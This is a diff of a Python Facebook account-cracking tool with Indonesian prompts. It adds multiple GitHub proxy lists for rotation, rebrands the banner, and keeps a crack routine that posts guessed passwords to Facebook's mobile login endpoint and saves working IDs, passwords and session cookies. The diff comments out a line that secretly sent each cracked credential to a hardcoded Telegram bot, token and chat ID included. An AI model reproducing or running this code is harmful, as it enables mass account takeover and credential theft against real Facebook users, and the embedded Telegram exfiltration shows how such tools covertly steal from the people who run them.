@@ -37,11 +37,67 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	open('.prox.txt','w').write(prox)
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
 except Exception as e:
-	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;92m maskprivate1457')
-prox=open('.prox.txt','r').read().splitlines()
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://github.com/Chigozieworldwide/KING/blob/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.randrange(1, 9)
@@ -598,14 +654,19 @@ def back():
 def banner():
 	clear()
 	alvino_xy(f'''\t{asu}                                                
-
-██╗   ██╗ █████╗ ███╗   ███╗ █████╗  ██████╗
-╚██╗ ██╔╝██╔══██╗████╗ ████║██╔══██╗██╔════╝
- ╚████╔╝ ███████║██╔████╔██║███████║██║     
-  ╚██╔╝  ██╔══██║██║╚██╔╝██║██╔══██║██║     
-   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║╚██████╗
-   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝
-   FIX ID PUBLIC BY @MR_4HMED
+██████   █████  ██     ██  █████  
+██   ██ ██   ██ ██     ██ ██   ██ 
+██████  ███████ ██  █  ██ ███████ 
+██   ██ ██   ██ ██ ███ ██ ██   ██ 
+██   ██ ██   ██  ███ ███  ██   ██
+                                   
+                                 
+              
+     
+__________________________________
+TOOL BY RAWA🧠
+NETWORK + 3G 4G 5G STORNG🥷
+VERSION + 1.0.0.1🌼
                                             
 		''')
 def login():
@@ -632,7 +693,7 @@ def login_lagi334():
 		banner()
 		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		cookie=input(f'  [{h}•{x}] COOKIES :{asu} ')
 		cookies = {'cookie':cookie}
 		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
 		req = ses.get(url,cookies=cookies)
@@ -647,7 +708,7 @@ def login_lagi334():
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		print(f'  %s[%sx%s]%s DAXL BU !!%s'%(x,k,x,m,x))
 		exit()
 def menu(id):
 	try:
@@ -663,15 +724,16 @@ def menu(id):
 	print('\x1b[1;92m<--------------------------------------------------------------------------->')
 	print('\t\t\t\t       \x1b[1;92m▪︎\x1b[1;93m▪︎\x1b[1;91m▪︎\x1b[1;92mINFORMASI AUTHOR\x1b[1;91m▪︎\x1b[1;93m▪︎\x1b[1;92m▪︎')
 	print('')
-	print('\x1b[1;93m[\x1b[1;92m▪︎\x1b[1;93m] \x1b[1;92mTELEGRAM      : \x1b[1;93m@Ss6s3 \33[m\x1b[1;92m')
-	print('\x1b[1;93m[\x1b[1;92m▪︎\x1b[1;93m] \x1b[1;92mCHANAEL      : \x1b[1;93m@staff_1668')
-	print('\x1b[1;93m[\x1b[1;92m▪︎\x1b[1;93m] \x1b[1;92mVERSION      : \x1b[1;93m0.1')
-	print('\x1b[1;92m<--------------------------------------------------------------------------->')
+	#print('\x1b[1;93m[\x1b[1;92m▪︎\x1b[1;93m] \x1b[1;92mTELEGRAM      : \x1b[1;93m@Ss6s3 \33[m\x1b[1;92m')
+	#print('\x1b[1;93m[\x1b[1;92m▪︎\x1b[1;93m] \x1b[1;92mCHANAEL      : \x1b[1;93m@staff_1668')
+	#print('\x1b[1;93m[\x1b[1;92m▪︎\x1b[1;93m] \x1b[1;92mVERSION      : \x1b[1;93m0.1')
+	#print('\x1b[1;92m<--------------------------------------------------------------------------->')
 	print('\t\t\t\t        \x1b[1;92m▪︎\x1b[1;93m▪︎\x1b[1;91m▪︎\x1b[1;92mINFORMASI MENU\x1b[1;91m▪︎\x1b[1;93m▪︎\x1b[1;92m▪︎')
 	print('')
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. Crack Publik \33[m\x1b[1;92m\33[m')
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m0. Keluar ')
-	_____alvino__adijaya_____ = input('\n\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih > \x1b[1;93m ')
+	#print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. Crack Publik \33[m\x1b[1;92m\33[m')
+	print('\x1b[1;91m[ 3 ] CRACK FILE')
+	#print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m0. Keluar ')
+	_____alvino__adijaya_____ = input('\n\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mHALZHERA \x1b[1;93m ')
 	print('')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
@@ -754,9 +816,9 @@ def dump_massal():
 		time.sleep(3)
 		back()
 def setting():
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. OLD ')
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m2.  NEW ')
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m3. RANDOM ')
+	#print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. OLD ')
+	#print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m2.  NEW ')
+	print('RANDOM FACEBOOK')
 	print('')
 	hu = input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih > \x1b[1;93m ')
 	print('')
@@ -780,10 +842,10 @@ def setting():
 	else:
 		print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih Yang Bener Kak !')
 		exit()
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. Mobile \33[m(\x1b[1;93md.facebook.com\33[m) \33[m[\x1b[1;92mVery Recomended\33[m]')
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m2. Touch \33[m(\x1b[1;93mtouch.facebook.com\33[m) \33[m[\x1b[1;91mNot Recomended\33[m]')
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m3. Mtouch \33[m(\x1b[1;93mmbasic.facebook.com\33[m) \33[m[\x1b[1;91mNot Recomended\33[m]')
-	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m4. Mbasic \33[m(\x1b[1;93mm.facebook.com\33[m) \33[m[\x1b[1;92mRecomended\33[m]')
+	print('METHOD D [ 1 ]')
+	#print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m2. Touch \33[m(\x1b[1;93mtouch.facebook.com\33[m) \33[m[\x1b[1;91mNot Recomended\33[m]')
+	#print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m3. Mtouch \33[m(\x1b[1;93mmbasic.facebook.com\33[m) \33[m[\x1b[1;91mNot Recomended\33[m]')
+	#print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m4. Mbasic \33[m(\x1b[1;93mm.facebook.com\33[m) \33[m[\x1b[1;92mRecomended\33[m]')
 	print('')
 	hc = input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih > \x1b[1;93m')
 	print('')
@@ -820,9 +882,9 @@ def setting():
 def passwrd():
 	print('\x1b[1;92m<--------------------------------------------------------------------------->')
 	print('')
-	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>{x}Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>{x}Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mMainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
+	#print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>{x}Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	#print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>{x}Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	#print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mMainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -926,7 +988,7 @@ def crack(idf,pwv):
 })
 			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x}DANAR CP \n{M}EMAIL    : {K}{idf}\n{M}PASWORD  : {K}{pw}\n')     
+				#print(f'\r{x}DANAR CP \n{M}EMAIL    : {K}{idf}\n{M}PASWORD  : {K}{pw}\n')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -936,8 +998,8 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				
-				requests.get(f"https://api.telegram.org/bot6025762213:AAH29kD1LrMDsjG4lBzGgVl6kT4dV0OaoUY/sendMessage?chat_id=1396443240&text=\r {idf} | {pw}")
-				print(f'\r{x}{B}EMAIL    :  {H}{idf} \n{B}PASSWORD : {H} {pw}\n')
+				#requests.get(f"https://api.telegram.org/bot6025762213:AAH29kD1LrMDsjG4lBzGgVl6kT4dV0OaoUY/sendMessage?chat_id=1396443240&text=\r {idf} | {pw}")
+				print(f'\r\x1b[32[RAWA-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
 				break
